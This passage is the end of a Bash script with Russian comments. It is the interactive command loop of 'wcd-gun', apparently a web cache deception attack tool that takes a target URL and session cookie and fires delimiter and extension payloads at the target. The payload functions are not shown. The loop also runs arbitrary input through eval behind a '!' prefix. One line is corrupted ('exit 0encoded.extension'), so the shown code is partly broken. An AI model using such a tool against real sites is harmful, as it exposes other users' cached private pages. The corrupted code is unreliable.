    echo ""
    echo -e "${CYAN}Введи 'help' для списка команд${NC}"
    
    # Главный цикл обработки команд
    while true; do
        echo ""
        read -p "wcd-gun > " cmd arg1 arg2
        
        case $cmd in
            "set")
                case $arg1 in
                    "target") set_target "$arg2" ;;
                    "cookie") set_cookie "$arg2" ;;
                    *) echo -e "${RED}Используй: set target <URL> или set cookie <COOKIE>${NC}" ;;
                esac
                ;;
            "proxy")
                set_proxy "$arg1"
                ;;
            "target")
                show_target
                ;;
            "cookie")
                show_cookie
                ;;
            "load"|"ld")
                if [[ -z "$arg1" ]]; then
                    echo -e "${YELLOW}[!] Укажи имя обоймы. Доступные:${NC}"
                    list_delimiters_magazines
                else
                    # Загружаем и разделители, и расширения (если есть)
                    load_delimiters_magazine "$arg1"
                                        # Пытаемся загрузить расширения, если файл есть
                    if [[ -f "$MAGAZINE_DIR/${arg1}.extensions" ]]; then
                        load_extensions_magazine "$arg1"
                    else
                        echo -e "${YELLOW}[*] Обойма расширений '${arg1}' не найдена, использую текущие${NC}"
                    fi
                fi
                ;;
            "single")
                single_shot "$arg1" "$arg2"
                ;;
            "quick")
                quick_shot "$arg1" "$arg2"
                ;;
            "show")
                show_response "$arg1" "$arg2"
                ;;
            "raw")
                raw_request "$arg1"
                ;;
            "add")
                add_delimiter "$arg1"
                ;;
            "addmany")
                add_delimiters_batch
                ;;
            "remove")
                remove_delimiter "$arg1"
                ;;
            "delimiters")
                show_delimiters
                ;;
            "clear_delimiters")
                clear_delimiters
                ;;
            "reset_delimiters")
                reset_delimiters
                ;;
            "addext")
                add_extension "$arg1"
                ;;
            "addextmany")
                add_extensions_batch
                ;;
            "remext")
                remove_extension "$arg1"
                ;;
            "extensions")
                show_extensions
                ;;
            "clear_extensions")
                clear_extensions
                ;;
            "reset_extensions")
                reset_extensions
                ;;
            "save_d")
                save_delimiters_magazine "$arg1"
                ;;
            "load_d")
                load_delimiters_magazine "$arg1"
                ;;
            "list_d")
                list_delimiters_magazines
                ;;
            "delete_d")
                delete_delimiters_magazine "$arg1"
                ;;
            "save_e")
                save_extensions_magazine "$arg1"
                ;;
            "load_e")
                load_extensions_magazine "$arg1"
                ;;
            "list_e")
                list_extensions_magazines
                ;;
            "delete_e")
                delete_extensions_magazine "$arg1"
                ;;
            "magazines")
                show_magazines
                ;;
            "fire")
                fire
                ;;
            "check")
                check_target "$arg1"
                ;;
            "clear")
                banner
                ;;
            "help"|"?")
                show_help
                ;;
            "exit"|"quit")
                echo -e "${YELLOW}Выключаю пулемёт...${NC}"
                log_event "STOP" "Сессия завершена пользователем"
                exit 0encoded.extension
                ;;
            "")
                # Пустой ввод - игнорируем
                ;;
            !*)
                local full_cmd="$cmd $arg1 $arg2"
                local shell_cmd="${full_cmd#!}"
                eval "$shell_cmd" 2>/dev/null || echo -e "${RED}[!] Ошибка выполнения команды${NC}"
                ;;
            *)
                echo -e "${RED}Неизвестная команда: $cmd${NC}"
                log_event "WARN" "Неизвестная команда" "$cmd"
                ;;
        esac
    done
}

# =============================================================================
# ТОЧКА ВХОДА
# =============================================================================
main "$@"